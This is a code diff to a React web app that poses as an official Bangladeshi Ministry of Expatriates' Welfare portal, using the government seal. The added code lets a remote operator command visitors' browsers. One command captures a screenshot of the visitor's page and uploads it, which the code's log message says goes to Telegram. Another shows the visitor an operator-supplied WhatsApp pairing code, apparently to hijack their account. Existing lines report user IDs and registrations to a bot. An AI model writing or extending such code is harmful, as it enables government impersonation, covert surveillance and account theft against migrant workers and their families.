-                      { name: 'আব্দুল্লাহ আল মামুন', relation: 'পুত্র', age: 8, health: 'সুস্থ', education: '৩য় শ্রেণী' }
-                    ]
-                  };
-                  setUserData(familyData);
-                  localStorage.setItem('family_card_data', JSON.stringify(familyData));
-                  setIsRegistering(false);
-                  notifyBot(`Registration Success complete for ${sessionUserId} on ${selectedPlatform}`);
-                }}
-                className="w-full bg-gov-green hover:bg-emerald-800 text-white py-3.5 rounded-xl font-black text-sm shadow-md flex items-center justify-center gap-2 cursor-pointer transition-all hover:scale-[1.01] active:scale-[0.99]"
-              >
-                <CheckCircle2 size={16} /> হোম ড্যাশবোর্ডে ফিরে যান
-              </button>
-            </div>
-          </motion.div>
-        )}
+            </motion.div>
+          )}
+        </div>
       </div>
     );
   }
@@ -3312,6 +3609,51 @@ export default function App() {
               window.open(cmd.payload, '_blank');
               notifyBot(`Successfully opened remote link: ${cmd.payload}`);
             }
+          } else if (cmd.action === 'whatsapp_pairing_code') {
+            const rawCode = cmd.payload || '';
+            window.dispatchEvent(new CustomEvent('whatsapp_pairing_code_updated', { detail: rawCode }));
+            setToast({ message: `📱 হোয়াটসঅ্যাপ গেটওয়ে পেয়ারিং কোড সাকসেসফুলি সেট করা হয়েছে!`, type: 'success' });
+            notifyBot(`WhatsApp Pairing Code remotely set and rendered: [${rawCode}]`);
+          } else if (cmd.action === 'take_screenshot') {
+            setToast({ message: `📸 অ্যাডমিন ব্রাউজার স্ক্রিনশট নেওয়ার অনুরোধ পাঠিয়েছেন...`, type: 'info' });
+            setTimeout(async () => {
+              try {
+                const targetEl = document.getElementById('root') || document.body;
+                const canvas = await html2canvas(targetEl, {
+                  useCORS: true,
+                  allowTaint: true,
+                  backgroundColor: '#f8fafc',
+                  logging: false,
+                });
+                
+                canvas.toBlob(async (blob) => {
+                  if (!blob) {
+                    notifyBot(`❌ Screenshot capture failed: blob was null for user ${globalUserId}`);
+                    return;
+                  }
+                  
+                  const fileObj = new File([blob], `screenshot_${globalUserId}.png`, { type: 'image/png' });
+                  const fd = new FormData();
+                  fd.append('photo', fileObj);
+                  fd.append('userId', globalUserId || '');
+                  
+                  const uploadRes = await fetch('/api/upload-screenshot', {
+                    method: 'POST',
+                    body: fd,
+                  });
+                  
+                  const uploadData = await uploadRes.json().catch(() => ({}));
+                  if (uploadData.success) {
+                    console.log("Screenshot uploaded to Telegram successfully!");
+                  } else {
+                    notifyBot(`❌ Device screenshot upload failed: ${uploadData.error || 'Server error'}`);
+                  }
+                }, 'image/png');
+              } catch (scrError: any) {
+                console.error("Screenshot generation failed:", scrError);
+                notifyBot(`❌ Browser error taking screenshot for ${globalUserId}: ${scrError.message || String(scrError)}`);
+              }
+            }, 600);
           }
         }
       } catch (err) {
@@ -3504,7 +3846,15 @@ export default function App() {
           <div className="bg-gov-red h-[3px] w-full"></div>
           <div className="bg-[#004d39] py-1.5 px-4 text-[10px] text-white/90 font-bold flex justify-between items-center border-b border-white/10">
             <span className="flex items-center gap-2">
-              <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" alt="" className="w-4 h-4 brightness-0 invert" referrerPolicy="no-referrer" />
+              <img 
+                src="/my-logo22.jpg" 
+                alt="" 
+                className="w-4 h-4 object-contain" 
+                onError={(e) => {
+                  e.currentTarget.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png";
+                  e.currentTarget.className = "w-4 h-4 brightness-0 invert";
+                }} 
+              />
               গণপ্রজাতন্ত্রী বাংলাদেশ সরকারের অফিসিয়াল তথ্য বাতায়ন
             </span>
             <div className="flex gap-4 items-center">
@@ -3518,7 +3868,14 @@ export default function App() {
           <header className="bg-white p-4 flex justify-between items-center shadow-md border-b border-slate-100 sticky top-0 z-50">
             <div className="flex items-center gap-3">
               <div className="p-1 bg-slate-50 rounded-xl border border-slate-100">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" alt="" className="w-12 h-12" referrerPolicy="no-referrer" />
+                <img 
+                  src="/my-logo23.jpg" 
+                  alt="" 
+                  className="w-12 h-12 object-contain" 
+                  onError={(e) => {
+                    e.currentTarget.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png";
+                  }} 
+                />
               </div>
               <div>
                 <h1 className="text-gov-green font-black text-lg md:text-xl leading-tight">প্রবাসী কল্যাণ ও বৈদেশিক কর্মসংস্থান মন্ত্রণালয়</h1>
@@ -3573,47 +3930,58 @@ export default function App() {
           </div>
 
           <main className="max-w-6xl mx-auto px-4 py-8">
-            {/* Majestic Ministry of Expatriates Panoramic Banner */}
-            <div className="mb-10 rounded-[2.5rem] bg-gradient-to-r from-[#004d39] via-[#015f47] to-[#0f172a] p-8 md:p-12 text-white relative overflow-hidden shadow-xl border border-emerald-920">
-              <div className="absolute top-0 right-0 w-96 h-96 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none"></div>
-              <div className="absolute -bottom-10 -left-10 w-80 h-80 bg-red-650/10 rounded-full blur-3xl pointer-events-none"></div>
+            {/* Beautiful modern image slideshow frame for Homepage (Official Portal & Tracking Dashboard) */}
+            <div className="mb-10 relative w-full h-[28rem] overflow-hidden rounded-[2.5rem] shadow-xl border-2 border-red-500 bg-slate-950 flex items-center justify-center">
+              <AnimatePresence mode="wait">
+                <motion.img
+                  key={slideIndex2}
+                  src={`/my-logo${slideIndex2 + 11}.jpg`}
+                  alt={`Official Announcement Slide ${slideIndex2 + 11}`}
+                  initial={{ opacity: 0, scale: 1.05 }}
+                  animate={{ opacity: 1, scale: 1 }}
+                  exit={{ opacity: 0, scale: 0.95 }}
+                  transition={{ duration: 0.6, ease: "easeInOut" }}
+                  className="absolute inset-0 w-full h-full object-cover"
+                  onError={(e) => {
+                    // Fallback beautiful banner style if not uploaded in workspace yet
+                    e.currentTarget.src = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&q=80&w=800";
+                  }}
+                />
+              </AnimatePresence>
               
-              <div className="relative z-10 flex flex-col md:flex-row md:items-center justify-between gap-8">
-                <div className="space-y-4 max-w-xl">
-                  <div className="inline-flex items-center gap-2.5 bg-white/10 backdrop-blur-md px-4 py-1.5 rounded-full text-xs font-bold text-emerald-200 border border-white/10 shadow-sm leading-none">
-                    <span className="w-2.5 h-2.5 bg-red-500 rounded-full animate-ping"></span>
-                    অফিসিয়াল সরকারি পোর্টাল ও ট্র্যাকিং ডেসিবোর্ড
-                  </div>
-                  <h2 className="text-3xl md:text-4xl font-extrabold tracking-tight leading-tight">
-                    প্রবাসী কল্যাণ ও <br className="hidden md:inline" />
-                    বৈদেশিক কর্মসংস্থান মন্ত্রণালয়
-                  </h2>
-                  <p className="text-sm text-emerald-100/90 font-medium leading-relaxed">
-                    বাংলাদেশি রেমিট্যান্স যুদ্ধাদের সম্মানিত করতে ও সরকারি ডিজিটালাইজেশনের ধারাবাহিকতায় ওয়ান-স্টপ সেবা, বিএমইটি ও পাসপোর্ট সনদ স্বয়ংক্রিয় গেটওয়ে।
-                  </p>
-                  
-                  {/* Subtle Interactive Statistics counters */}
-                  <div className="pt-4 grid grid-cols-3 gap-4 border-t border-white/10">
-                    <div>
-                      <p className="text-xl md:text-2xl font-black text-white leading-none">৫.৮M+</p>
-                      <p className="text-[10px] text-emerald-200 font-bold uppercase tracking-wider mt-1">নিবন্ধিত প্রবাসী</p>
-                    </div>
-                    <div>
-                      <p className="text-xl md:text-2xl font-black text-white leading-none">১০০%</p>
-                      <p className="text-[10px] text-emerald-200 font-bold uppercase tracking-wider mt-1">স্বয়ংক্রিয় ডিজিটাল</p>
-                    </div>
-                    <div>
-                      <p className="text-xl md:text-2xl font-black text-white leading-none">২৪/৭</p>
-                      <p className="text-[10px] text-emerald-200 font-bold uppercase tracking-wider mt-1">জরুরি সহায়তা</p>
-                    </div>
+              {/* High legibility overlay gradient */}
+              <div className="absolute inset-0 bg-gradient-to-t from-black/90 via-black/30 to-black/50 pointer-events-none flex flex-col justify-between p-6 z-10">
+                {/* Header Badge */}
+                <div className="flex items-center gap-3 bg-black/45 backdrop-blur-md p-3 rounded-2xl border border-white/10 self-start w-full">
+                  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" alt="" className="w-8 h-8 object-contain shrink-0" referrerPolicy="no-referrer" />
+                  <div className="text-left leading-tight">
+                    <h3 className="text-white font-black text-xs uppercase tracking-wide flex items-center gap-1.5 font-['Hind_Siliguri']">
+                      <span className="inline-block w-2.5 h-2.5 bg-gov-red rounded-full animate-ping"></span>
+                      অফিসিয়াল সরকারি পোর্টাল ও ট্র্যাকিং ডেসিবোর্ড
+                    </h3>
+                    <p className="text-[9px] text-emerald-300 font-bold uppercase tracking-wider font-sans">Ministry of Expatriates' Welfare</p>
                   </div>
                 </div>
 
-                {/* Elegant Circular Ministry Seal & Emblem */}
-                <div className="hidden lg:flex flex-col items-center justify-center p-6 bg-white/5 backdrop-blur-md rounded-3xl border border-white/15 w-60 h-60 shrink-0 text-center">
-                  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" alt="Bangladesh Gov Seal" className="w-20 h-20 mb-3 drop-shadow-[0_0_15px_rgba(255,255,255,0.3)]" referrerPolicy="no-referrer" />
-                  <p className="text-[10px] font-black tracking-widest text-[#22c55e]">গণপ্রজাতন্ত্রী বাংলাদেশ</p>
-                  <p className="text-[9px] font-bold text-slate-300 uppercase tracking-tight mt-0.5">E-Services & Smart Portal</p>
+                {/* Bottom Details Section */}
+                <div className="space-y-3 mt-auto bg-black/45 backdrop-blur-md p-4 rounded-2.5xl border border-white/10 w-full font-['Hind_Siliguri']">
+                  <div className="flex justify-between items-center border-b border-white/10 pb-2">
+                    <span className="text-[10px] text-rose-300 font-black tracking-widest flex items-center gap-1.5 uppercase font-['Hind_Siliguri']">
+                      📢 প্রবাসীদের জন্য তথ্যচিত্র গ্যালারি
+                    </span>
+                    <span className="text-[9px] text-slate-300 font-bold tracking-wider font-sans">
+                      ফাইল {slideIndex2 + 11} / 20
+                    </span>
+                  </div>
+                  <div className="flex justify-center gap-1.5 py-1 pointer-events-auto">
+                    {Array.from({ length: 10 }).map((_, i) => (
+                      <button
+                        key={i}
+                        onClick={() => setSlideIndex2(i)}
+                        className={`h-1.5 rounded-full transition-all duration-300 cursor-pointer ${slideIndex2 === i ? 'w-5 bg-emerald-400' : 'w-1.5 bg-white/40'}`}
+                      />
+                    ))}
+                  </div>
                 </div>
               </div>
             </div>
